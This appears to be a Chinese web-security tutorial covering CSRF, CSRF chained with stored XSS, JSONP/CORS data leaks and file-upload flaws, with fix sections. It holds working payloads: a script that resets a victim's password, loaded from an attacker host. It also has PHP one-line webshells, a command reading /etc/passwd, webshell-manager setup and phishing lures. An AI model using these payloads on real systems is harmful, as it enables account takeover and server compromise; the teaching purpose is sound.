+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>诱导受害者执行非本意的操作</p>
+<pre><code class="hljs plain">盗号：诱导受害者修改自己的密码、修改自己的绑定手机号、发送敏感信息等
+改个人信息：诱导受害者修改自己的头像、个性签名、改自己的昵称
+诱导受害者执行命令</code></pre>
+
+<h3 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h3><pre><code class="hljs plain">csrf一般无需代码审计，只有黑盒测试
+burp抓包，在请求中所有的参数都可控(所有的参数你能看的懂)，就存在csrf
+是否是漏洞，主要看 csrf 能不能诱导受害者执行高危操作
+
+如：https://www.google.com/search?q=123</code></pre>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h3 id="GET型-CSRF-漏洞"><a href="#GET型-CSRF-漏洞" class="headerlink" title="GET型 CSRF 漏洞"></a>GET型 CSRF 漏洞</h3><h4 id="1-找到有高危操作处的-csrf漏洞，直接复制-URL-即可实现-payload-编写"><a href="#1-找到有高危操作处的-csrf漏洞，直接复制-URL-即可实现-payload-编写" class="headerlink" title="1 找到有高危操作处的 csrf漏洞，直接复制 URL 即可实现 payload 编写"></a>1 找到有高危操作处的 csrf漏洞，直接复制 URL 即可实现 payload 编写</h4><p>payload 攻击载荷：  <a target="_blank" rel="noopener" href="http://192.168.79.129/logout.php">http://192.168.79.129/logout.php</a></p>
+<p>攻击者需要诱导 受害者点击 payload 中的链接， 受害者如果点击，受害者的账户就会被退出</p>
+<p>csrf 漏洞的关键，在于怎么才能诱导受害者点击？</p>
+<pre><code class="hljs plain">直接微信聊 （一般没人点）：这个网站好看，点一下试试？ http://192.168.79.129/logout.php
+封装成钓鱼网站 （抽奖网站）、伪装成二维码、钓鱼邮件
+和存储型xss联合使用,自动触发 （严重漏洞）</code></pre>
+
+<h3 id="POST-型CSRF漏洞"><a href="#POST-型CSRF漏洞" class="headerlink" title="POST 型CSRF漏洞"></a>POST 型CSRF漏洞</h3><h4 id="1-找到有高危操作处的-csrf漏洞，使用burp进行构造-payload"><a href="#1-找到有高危操作处的-csrf漏洞，使用burp进行构造-payload" class="headerlink" title="1 找到有高危操作处的 csrf漏洞，使用burp进行构造 payload"></a>1 找到有高危操作处的 csrf漏洞，使用burp进行构造 payload</h4><h4 id="2-把burpsuite-生成的-poc-保存到一个-html-文件中"><a href="#2-把burpsuite-生成的-poc-保存到一个-html-文件中" class="headerlink" title="2 把burpsuite 生成的 poc 保存到一个 html 文件中"></a>2 把burpsuite 生成的 poc 保存到一个 html 文件中</h4><h4 id="3-开启监听，-得到钓鱼链接-http-192-168-79-120-8000-1-html"><a href="#3-开启监听，-得到钓鱼链接-http-192-168-79-120-8000-1-html" class="headerlink" title="3 开启监听， 得到钓鱼链接 http://192.168.79.120:8000/1.html"></a>3 开启监听， 得到钓鱼链接 <a target="_blank" rel="noopener" href="http://192.168.79.120:8000/1.html">http://192.168.79.120:8000/1.html</a></h4><p> <code>python -m http.server </code></p>
+<h4 id="4-把钓鱼链接发给受害者，想方设法让受害者点击，受害一旦点击，就会把自己的密码修改为-123，即可实现盗号"><a href="#4-把钓鱼链接发给受害者，想方设法让受害者点击，受害一旦点击，就会把自己的密码修改为-123，即可实现盗号" class="headerlink" title="4 把钓鱼链接发给受害者，想方设法让受害者点击，受害一旦点击，就会把自己的密码修改为 123，即可实现盗号"></a>4 把钓鱼链接发给受害者，想方设法让受害者点击，受害一旦点击，就会把自己的密码修改为 123，即可实现盗号</h4><p> <a target="_blank" rel="noopener" href="http://192.168.79.120:8000/1.html">http://192.168.79.120:8000/1.html</a></p>
+<h3 id="GET型CSRF漏洞-存储型XSS漏洞"><a href="#GET型CSRF漏洞-存储型XSS漏洞" class="headerlink" title="GET型CSRF漏洞+存储型XSS漏洞"></a>GET型CSRF漏洞+存储型XSS漏洞</h3><p>无需诱导受害者访问，由 存储型xss 自动触发</p>
+<p><strong>csrf payload：</strong>  <a target="_blank" rel="noopener" href="http://192.168.79.129/logout.php">http://192.168.79.129/logout.php</a></p>
+<p>**xss payload: **</p>
+<p>⚠️：用 xss payload 打 xss漏洞，实现危害：受害者登录用户，干什么都会自动被登出，网站损坏</p>
+<h3 id="POST-型CSRF漏洞-存储型XSS漏洞"><a href="#POST-型CSRF漏洞-存储型XSS漏洞" class="headerlink" title="POST 型CSRF漏洞+存储型XSS漏洞"></a>POST 型CSRF漏洞+存储型XSS漏洞</h3><h4 id="1-构造csrf-漏洞的-payload"><a href="#1-构造csrf-漏洞的-payload" class="headerlink" title="1  构造csrf 漏洞的 payload"></a>1  构造csrf 漏洞的 payload</h4><p>exp.js</p>
+<pre><code class="hljs javascript">$.<span class="hljs-title function_">ajax</span>(&#123;
+  <span class="hljs-comment">// 下面是 受害者 URL</span>
+  <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;http://目标IP/change_password.php&#x27;</span>,
+  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,
+  <span class="hljs-title class_">ContentType</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,
+  <span class="hljs-attr">data</span>: <span class="hljs-string">&#x27;new_password=123&amp;confirm_password=123&#x27;</span>
+&#125;);</code></pre>
+
+<h4 id="2-编写-xss-payload"><a href="#2-编写-xss-payload" class="headerlink" title="2  编写 xss payload"></a>2  编写 xss payload</h4><pre><code class="hljs java">&lt;script src=<span class="hljs-string">&quot;https://code.jquery.com/jquery-1.12.4.min.js&quot;</span>&gt;&lt;/script&gt;
+&lt;script src=<span class="hljs-string">&quot;http://192.168.79.120:8000/exp.js&quot;</span>&gt;&lt;/script&gt;
+
+&lt;script src=<span class="hljs-string">&quot;http://攻击者IP:8000/exp.js&quot;</span>&gt;&lt;/script&gt;</code></pre>
+
+<p>为什么xss payload 需要加上 jquery 的依赖？</p>
+<p>因为exp.js 中用了 ajax，是基于 jquery 的 （实际 大部分网站都有 jquery ，可以忽略依赖）</p>
+<h4 id="3-用-xss-payload-攻击目标网站存在xss漏洞的地方"><a href="#3-用-xss-payload-攻击目标网站存在xss漏洞的地方" class="headerlink" title="3  用 xss payload 攻击目标网站存在xss漏洞的地方"></a>3  用 xss payload 攻击目标网站存在xss漏洞的地方</h4><h4 id="4-受害者登录用户，进入首页，自动触发修改密码。-受害者如果登出，再登录，原有密码将无法使用"><a href="#4-受害者登录用户，进入首页，自动触发修改密码。-受害者如果登出，再登录，原有密码将无法使用" class="headerlink" title="4  受害者登录用户，进入首页，自动触发修改密码。 受害者如果登出，再登录，原有密码将无法使用"></a>4  受害者登录用户，进入首页，自动触发修改密码。 受害者如果登出，再登录，原有密码将无法使用</h4><h3 id="修复及防御"><a href="#修复及防御" class="headerlink" title="修复及防御"></a>修复及防御</h3><pre><code class="hljs plain">添加一个不可控的参数
+如：修改密码需要用户输入原密码、手机验证码、生物指纹、安全问题、 随机token</code></pre>
+
+<hr>
+<h2 id="第二部分：特殊-CSRF-类型与文件上传"><a href="#第二部分：特殊-CSRF-类型与文件上传" class="headerlink" title="第二部分：特殊 CSRF 类型与文件上传"></a>第二部分：特殊 CSRF 类型与文件上传</h2><h3 id="特殊-CSRF-类型-跨域请求漏洞"><a href="#特殊-CSRF-类型-跨域请求漏洞" class="headerlink" title="特殊 CSRF 类型-跨域请求漏洞"></a>特殊 CSRF 类型-跨域请求漏洞</h3><h3 id="同源网站"><a href="#同源网站" class="headerlink" title="同源网站"></a>同源网站</h3><p>两个网站，协议一样，端口一样，域名或IP一致，就称两个网站同源</p>
+<pre><code class="hljs http">http://www.baidu.com
+https://www.baidu.com
+https://tieba.baidu.com:443/login.aspx
+https://tieba.baidu.com/index.aspx
+http://tieba.baidu.com:443/index.aspx
+
+上述5个站点，只有3、4为同源</code></pre>
+
+<h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>浏览器默认的安全策略，不同源的两个网站之间不能相互读写资源，如DOM 无法使用，cookie无法读取，XHR(XMLHttpRequest、ajax、axios)无法发送</p>
+<h3 id="跨域请求"><a href="#跨域请求" class="headerlink" title="跨域请求"></a>跨域请求</h3><p>虽然浏览器限制 不同源不能相互读写资源，但实际开发中经常遇到不同源 之间相互读写资源的情况，</p>
+<p>这中特殊情况就称为 <strong>跨域请求</strong></p>
+<h3 id="跨域请求方式"><a href="#跨域请求方式" class="headerlink" title="跨域请求方式"></a>跨域请求方式</h3><h3 id="浏览器默认支持的跨域"><a href="#浏览器默认支持的跨域" class="headerlink" title="浏览器默认支持的跨域"></a>浏览器默认支持的跨域</h3><ul>
+<li>img: 图像可以跨域、A站点可以使用B站点的 图像</li>
+<li>script:  js脚本可以跨域、A站点可以使用B站点的  js脚本</li>
+<li>iframe、vedio、link、等</li>
+</ul>
+<h3 id="jsonp-跨域"><a href="#jsonp-跨域" class="headerlink" title="jsonp 跨域"></a>jsonp 跨域</h3><p>开发过程中，百度贴吧（tieba.baidu.com）和 百度地图（maps.baidu.com）是两个不同源的网站，却相互支持传输凭据，可以 采用其他的跨域方式（jsonp、cors）</p>
+<p>把信息封装成浏览器默认支持的跨域标签，<strong>如  ，再进行数据传输</strong></p>
+<h3 id="cors-跨域"><a href="#cors-跨域" class="headerlink" title="cors 跨域"></a>cors 跨域</h3><p>开发者预先配置好中间件，提前告诉浏览器两个不同源的网站可以相互读写资源，网站就会忽略浏览器的 同源策略限制</p>
+<h3 id="jsonp-跨域请求漏洞"><a href="#jsonp-跨域请求漏洞" class="headerlink" title="jsonp 跨域请求漏洞"></a>jsonp 跨域请求漏洞</h3><h3 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h3><p>开发者 使用 jsonp 进行跨域时，没有注意敏感信息，直接使用 jsonp 传输了敏感数据</p>
+<h3 id="挖掘-1"><a href="#挖掘-1" class="headerlink" title="挖掘"></a>挖掘</h3><h4 id="寻找-JSONP-特征"><a href="#寻找-JSONP-特征" class="headerlink" title="寻找 JSONP  特征"></a>寻找 JSONP  特征</h4><pre><code class="hljs http">jsonp 是 GET请求，响应体的MIME类型是 application/javascript
+jsonp 有参数 &quot;callback&quot; 回调
+callback 的值和响应体中是 对应的关系</code></pre>
+
+<h4 id="判断是否为漏洞"><a href="#判断是否为漏洞" class="headerlink" title="判断是否为漏洞"></a>判断是否为漏洞</h4><p>看响应体中是否有敏感信息，有就是漏洞</p>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><h4 id="攻击者视角"><a href="#攻击者视角" class="headerlink" title="攻击者视角"></a>攻击者视角</h4><h4 id="1-抓包，-在攻击机（受害者必须要能连接到你的攻击机）编写-exp-html"><a href="#1-抓包，-在攻击机（受害者必须要能连接到你的攻击机）编写-exp-html" class="headerlink" title="1 抓包， 在攻击机（受害者必须要能连接到你的攻击机）编写 exp.html"></a>1 抓包， 在攻击机（受害者必须要能连接到你的攻击机）编写 exp.html</h4><p><a target="_blank" rel="noopener" href="http://192.168.79.120/jsonp_api.php?callback=handleData">http://192.168.79.120/jsonp_api.php?callback&#x3D;handleData</a></p>
+<h4 id="2-攻击者在攻击机开启监听"><a href="#2-攻击者在攻击机开启监听" class="headerlink" title="2  攻击者在攻击机开启监听"></a>2  攻击者在攻击机开启监听</h4><h4 id="3-攻击者构造钓鱼链接，诱导受害者点击-："><a href="#3-攻击者构造钓鱼链接，诱导受害者点击-：" class="headerlink" title="3  攻击者构造钓鱼链接，诱导受害者点击 ："></a>3  攻击者构造钓鱼链接，诱导受害者点击 ：</h4><p><a target="_blank" rel="noopener" href="http://192.168.79.120:8000/exp.html">http://192.168.79.120:8000/exp.html</a></p>
+<h4 id="4-如果受害者点了钓鱼链接，即可得到敏感信息"><a href="#4-如果受害者点了钓鱼链接，即可得到敏感信息" class="headerlink" title="4  如果受害者点了钓鱼链接，即可得到敏感信息"></a>4  如果受害者点了钓鱼链接，即可得到敏感信息</h4><h4 id="受害者视角"><a href="#受害者视角" class="headerlink" title="受害者视角"></a>受害者视角</h4><p>受害者如果点击了钓鱼链接，就会把敏感信息通过jsonp传输给黑客</p>
+<h3 id="CORS跨域请求漏洞"><a href="#CORS跨域请求漏洞" class="headerlink" title="CORS跨域请求漏洞"></a>CORS跨域请求漏洞</h3><p>CORS(跨域资源共享)</p>
+<h3 id="产生原因-2"><a href="#产生原因-2" class="headerlink" title="产生原因"></a>产生原因</h3><p>开发者使用cors 进行跨域时，没有注意敏感信息，直接使用 cors 传输了敏感数据</p>
+<h3 id="挖掘-2"><a href="#挖掘-2" class="headerlink" title="挖掘"></a>挖掘</h3><h4 id="寻找CORS-的特征"><a href="#寻找CORS-的特征" class="headerlink" title="寻找CORS 的特征"></a>寻找CORS 的特征</h4><p>请求头中加 Origin: xxx 响应头中有 Access-Control-Allow-Origin: xxx</p>
+<p>( 如果请求头中的 Origin 发生变化， 但是响应头中Access-Control-Allow-Origin不会变化，说明 是安全的 cors，无漏洞  )</p>
+<h4 id="判断是否是漏洞"><a href="#判断是否是漏洞" class="headerlink" title="判断是否是漏洞"></a>判断是否是漏洞</h4><p>响应是否有敏感信息</p>
+<h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><h4 id="攻击者视角-1"><a href="#攻击者视角-1" class="headerlink" title="攻击者视角"></a>攻击者视角</h4><h5 id="1-在攻击机（受害者必须要能连接到你的攻击机）编写-cors-exp-html"><a href="#1-在攻击机（受害者必须要能连接到你的攻击机）编写-cors-exp-html" class="headerlink" title="1  在攻击机（受害者必须要能连接到你的攻击机）编写 cors_exp.html"></a>1  在攻击机（受害者必须要能连接到你的攻击机）编写 cors_exp.html</h5><h5 id="2-开启监听"><a href="#2-开启监听" class="headerlink" title="2  开启监听"></a>2  开启监听</h5><h5 id="3-构造钓鱼链接，诱导受害者点击"><a href="#3-构造钓鱼链接，诱导受害者点击" class="headerlink" title="3  构造钓鱼链接，诱导受害者点击"></a>3  构造钓鱼链接，诱导受害者点击</h5><p><a target="_blank" rel="noopener" href="http://192.168.79.120:8000/cors_exp.html">http://192.168.79.120:8000/cors_exp.html</a></p>
+<h5 id="4-受害者如果点击，攻击就能收到信息"><a href="#4-受害者如果点击，攻击就能收到信息" class="headerlink" title="4  受害者如果点击，攻击就能收到信息"></a>4  受害者如果点击，攻击就能收到信息</h5><h4 id="受害者视角-1"><a href="#受害者视角-1" class="headerlink" title="受害者视角"></a>受害者视角</h4><p>访问钓鱼链接</p>
+<h3 id="Chrome的限制"><a href="#Chrome的限制" class="headerlink" title="Chrome的限制"></a>Chrome的限制</h3><h4 id="为什么cors用不了"><a href="#为什么cors用不了" class="headerlink" title="为什么cors用不了"></a>为什么cors用不了</h4><p>chrome 默认会在 XMLHttpRequest （ajax、axios）请求时自动去掉 cookie</p>
+<h4 id="Chrome-Cookie-属性"><a href="#Chrome-Cookie-属性" class="headerlink" title="Chrome Cookie 属性"></a>Chrome Cookie 属性</h4><p><strong>HTTP only</strong>  ： 禁止 js 读取 cookie ，缓解 xss漏洞攻击</p>
+<h4 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h4><p>SameSite 可能有三种值：</p>
+<pre><code class="hljs http">Strict ：cookie 不能跨域
+Lax： cookie有些能跨域，有些不能跨域 ，比 Strict宽松（chrome默认配置）
+None 空：cookie能跨域，但是必须和 Cookie的另一个属性 secure 联用</code></pre>
+
+<h4 id="secure"><a href="#secure" class="headerlink" title="secure"></a>secure</h4><p>secure 要求cookie跨域时，两个网站必须都是 https 网站</p>
+<h4 id="现如今如果想cors跨域的条件"><a href="#现如今如果想cors跨域的条件" class="headerlink" title="现如今如果想cors跨域的条件"></a>现如今如果想cors跨域的条件</h4><pre><code class="hljs http">cookie 是 SameSite 属性是 None
+双方网站必须是 HTTPS 网站</code></pre>
+
+<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><pre><code class="hljs http">正确配置 cors 跨域，谨慎使用 Access-Control-Allow-Origin: ⚠️
+尽量不要使用jsonp，转为使用 cors 跨域 （Cross-Origin Resource Sharing，跨源资源共享）
+跨域时，去除或加密敏感信息</code></pre>
+
+<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h3 id="产生原因-3"><a href="#产生原因-3" class="headerlink" title="产生原因"></a>产生原因</h3><p>开发者没有对用户上传的文件做严格的验证，导致用户可以上传任意的文件到服务器</p>
+<h3 id="危害-利用思路"><a href="#危害-利用思路" class="headerlink" title="危害(利用思路)"></a>危害(利用思路)</h3><pre><code class="hljs http">上传webshell ，控制目标服务器
+上传脏文件，消耗服务器的资源（带宽、存储）</code></pre>
+
+<h3 id="挖掘-3"><a href="#挖掘-3" class="headerlink" title="挖掘"></a>挖掘</h3><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><pre><code class="hljs http">定位、寻找文件上传功能的代码，如果是 php ，则定位 move_uploaded_file 函数
+官方链接：https://www.php.net/manual/zh/function.move-uploaded-file.php
+用户上传的文件有没有经过过滤，如果是php，主要看 $_FIFES</code></pre>
+
+<ul>
+<li>name 文件名</li>
+<li>size 文件大小</li>
+<li>type 文件类型</li>
+</ul>
+<h3 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h3><p>对所有的上传点、上传接口、上传功能逐一测试</p>
+<h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>网站后门</p>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><pre><code class="hljs http">一句话木马：一行或几行代码
+小马
+大马：功能齐全的木马</code></pre>
+
+<h3 id="php-webshell-php的代码执行函数"><a href="#php-webshell-php的代码执行函数" class="headerlink" title="php webshell ,php的代码执行函数"></a>php webshell ,php的代码执行函数</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.eval.php">https://www.php.net/manual/zh/function.eval.php</a></p>
+<p>把字符串作为PHP代码执行 (eval是语言构造器，不是函数)</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+  @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<p>解释：</p>
+<ul>
+<li>@ ： 忽略警告和报错信息</li>
+<li>$_POST : 接收POST参数，可以改为 $_GET (接收 get参数)、 $_REQUEST （接收get或 post参数） ⚠️ ：如果是 get 参数，参数中的特殊字符（URL保留字符）一定要URL编码</li>
+<li>[‘a’] : 参数的键名，可以随意修改，包裹的单引号，可以改为双引号，或无引号</li>
+</ul>
+<p>使用：</p>
+<p>⚠️ php代码必须以分号结尾  ： <code>参数的键名=php代码  </code></p>
+<p><code>a=phpinfo();</code></p>
+<p><code>a=echo &quot;hello&quot;;</code></p>
+<p>执行命令，需要嵌套命令执行函数，如 system</p>
+<p><code>a=system(&quot;cat /etc/passwd&quot;);</code></p>
+<h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><p>断言：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">https://www.php.net/manual/zh/function.assert.php</a></p>
+<p>⚠️ 代码执行的功能在 PHP 7.2.0 中弃用，并在 PHP 8.0.0 中移除</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+  @<span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;H&#x27;</span>]);
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h4><p>执行一个正则表达式的搜索和替换，使用 &#x2F;e 作为修饰符，会触发代码执行 （php 5.5 移除了 &#x2F;e 修饰符 )</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.preg-replace.php">https://www.php.net/manual/zh/function.preg-replace.php</a></p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/kls/e&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;H&#x27;</span>],<span class="hljs-string">&quot;kls&quot;</span>);
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><p>通过执行代码字符串创建动态函数</p>
+<p>⚠️ 自 PHP 7.2.0 起被废弃，并自 PHP 8.0.0 起被移除</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.create-function.php">https://www.php.net/manual/zh/function.create-function.php</a></p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+ <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;H&#x27;</span>]);
+ <span class="hljs-variable">$func</span>();
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h4><p>为数组的每个元素应用回调函数</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.array-map.php">https://www.php.net/manual/zh/function.array-map.php</a></p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-variable">$function_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fu&#x27;</span>];
+    <span class="hljs-variable">$function_args</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ar&#x27;</span>];
+    <span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>] = <span class="hljs-variable">$function_args</span>;
+    <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$function_name</span>,<span class="hljs-variable">$arr</span>);
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h4><p>使用回调函数过滤数组的元素</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.array-filter.php">https://www.php.net/manual/zh/function.array-filter.php</a></p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-variable">$function_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fu&#x27;</span>];
+    <span class="hljs-variable">$function_args</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ar&#x27;</span>];
+    <span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>] = <span class="hljs-variable">$function_args</span>;
+    <span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-variable">$arr</span>,<span class="hljs-variable">$function_name</span>);
+<span class="hljs-meta">?&gt;</span></code></pre>
+
+<h3 id="webshell-管理工具"><a href="#webshell-管理工具" class="headerlink" title="webshell 管理工具"></a>webshell 管理工具</h3><h3 id="AntSword"><a href="#AntSword" class="headerlink" title="AntSword"></a>AntSword</h3><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>github：  <a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
+<p>官方文档  ：<a target="_blank" rel="noopener" href="https://www.yuque.com/antswordproject/antsword/srruro">https://www.yuque.com/antswordproject/antsword/srruro</a></p>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>使用： 目前只支持 eval &#x2F;assert函数和 POST 参数</p>
+<h3 id="资源管理"><a href="#资源管理" class="headerlink" title="资源管理"></a>资源管理</h3><p>资源管理 （查看文件、删除文件、 上传文件）</p>
+<h3 id="虚拟终端"><a href="#虚拟终端" class="headerlink" title="虚拟终端"></a>虚拟终端</h3><h3 id="数据库管理"><a href="#数据库管理" class="headerlink" title="数据库管理"></a>数据库管理</h3><p>数据库管理 （前提是目标要有数据库，数据库的用户和密码可以从源代码中找到）</p>
+<h3 id="Behinder"><a href="#Behinder" class="headerlink" title="Behinder"></a>Behinder</h3><p>github:<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p>
+<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>1  下载 发行版，解压 Behinder_v4.1.t00ls.zip</p>
+<p>2  进入 Behinder.jar 当前目录，执行</p>
+<p><code>java -jar Behinder.jar</code></p>
+<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>⚠️ 冰蝎只能用自己的木马，木马文件在 server 目录中</p>
+<h3 id="修改冰蝎的webshell密码"><a href="#修改冰蝎的webshell密码" class="headerlink" title="修改冰蝎的webshell密码"></a>修改冰蝎的webshell密码</h3><p>冰蝎：默认密码是 rebeyond</p>
+<p>可以自己设置（md5加密）</p>
+<p> 修改 key 为 密码的 md5 hash的前16个字符</p>
+<p><strong>现在的密码是 kls</strong></p>
+<h3 id="资源管理-1"><a href="#资源管理-1" class="headerlink" title="资源管理"></a>资源管理</h3><h3 id="虚拟终端-1"><a href="#虚拟终端-1" class="headerlink" title="虚拟终端"></a>虚拟终端</h3><h3 id="数据库管理-1"><a href="#数据库管理-1" class="headerlink" title="数据库管理"></a>数据库管理</h3><p>连接字符串，通过 dsn 字符串链接</p>
+<p><code>mysql://用户:密码@IP地址:端口/数据库名  </code></p>
+<p><code>mysql://root:root@127.0.0.1:3306/mysql</code></p>
+<h3 id="蚁剑和冰蝎的区别"><a href="#蚁剑和冰蝎的区别" class="headerlink" title="蚁剑和冰蝎的区别"></a>蚁剑和冰蝎的区别</h3><p>蚁剑是明文传输、冰蝎是加密的</p>
+<p>下图是蚁剑流量，传输的是明文</p>
+<p>下图是冰蝎的流量，是加密的</p>
+<h3 id="Godzilla"><a href="#Godzilla" class="headerlink" title="Godzilla"></a>Godzilla</h3><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><p>github: <a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p>
+<p>下载发行版，进入 godzilla.jar 当前目录，执行</p>
+<p><code>java -jar godzilla.jar  </code></p>
+<h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><h4 id="上传并连接木马"><a href="#上传并连接木马" class="headerlink" title="上传并连接木马"></a>上传并连接木马</h4><h3 id="资源管理-2"><a href="#资源管理-2" class="headerlink" title="资源管理"></a>资源管理</h3><h3 id="虚拟终端-2"><a href="#虚拟终端-2" class="headerlink" title="虚拟终端"></a>虚拟终端</h3><h3 id="数据库管理-2"><a href="#数据库管理-2" class="headerlink" title="数据库管理"></a>数据库管理</h3><h3 id="哥斯拉和蚁剑的区别"><a href="#哥斯拉和蚁剑的区别" class="headerlink" title="哥斯拉和蚁剑的区别"></a>哥斯拉和蚁剑的区别</h3><p>哥斯拉是加密传输的，下图是哥斯拉的流量</p>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><pre><code class="hljs php">找到网站的上传点，上传webshell尝试
+找到自己刚刚上传的webshell在哪</code></pre>
+
+<h3 id="方法1：网站直接提供了点击按钮，点击即可访问"><a href="#方法1：网站直接提供了点击按钮，点击即可访问" class="headerlink" title="方法1：网站直接提供了点击按钮，点击即可访问"></a>方法1：网站直接提供了点击按钮，点击即可访问</h3><h3 id="方法2：如果上传的是图片（如上传头像），可以直接右键图片查看链接在"><a href="#方法2：如果上传的是图片（如上传头像），可以直接右键图片查看链接在" class="headerlink" title="方法2：如果上传的是图片（如上传头像），可以直接右键图片查看链接在"></a>方法2：如果上传的是图片（如上传头像），可以直接右键图片查看链接在</h3><h3 id="方法3：F12或HTTP-响应中慢慢找"><a href="#方法3：F12或HTTP-响应中慢慢找" class="headerlink" title="方法3：F12或HTTP 响应中慢慢找"></a>方法3：F12或HTTP 响应中慢慢找</h3><p>3  访问webshell，测试是否可以进行代码执行或命令执行</p>
+<p>4  webshell 管理工具连接</p>
+<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p>验证文件的后缀名和文件的具体类型</p>
+<pre><code class="hljs php">只允许后缀名为 .gif .png .jpg 的文件上传
+只允许实际类型为图片的文件上传（通过魔数判断文件类型</code></pre>
+
+<pre><code class="hljs php">PNG    <span class="hljs-number">89</span> <span class="hljs-number">50</span> <span class="hljs-number">4</span>E <span class="hljs-number">47</span>
+JPG    FF D8 FF
+GIF    <span class="hljs-number">47</span> <span class="hljs-number">49</span> <span class="hljs-number">46</span> <span class="hljs-number">38</span></code></pre>
+
+<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><ol>
+<li>拦截后缀名为 .php .asp .jsp 等的文件</li>
+<li>(waf都用这种）内容检测，对上传的文件内容做检测，检测文件中有没有 webshell 的特征 字符（比如检测文件内容中有没有 eval 、assert、 array_map   等</li>
+</ol>
+<h3 id="静态资源文件服务器"><a href="#静态资源文件服务器" class="headerlink" title="静态资源文件服务器"></a>静态资源文件服务器</h3><p>把用户上传的文件单独保存到一个服务器中，这个服务器只负责存储文件，不能解析和执行文件</p>
+<pre><code class="hljs xml">nginx 做的纯静态的服务器
+oss 阿里云对象存储云服务:          https://www.aliyun.com/product/oss
+cos 腾讯云对象存储:                https://cloud.tencent.com/product/cos
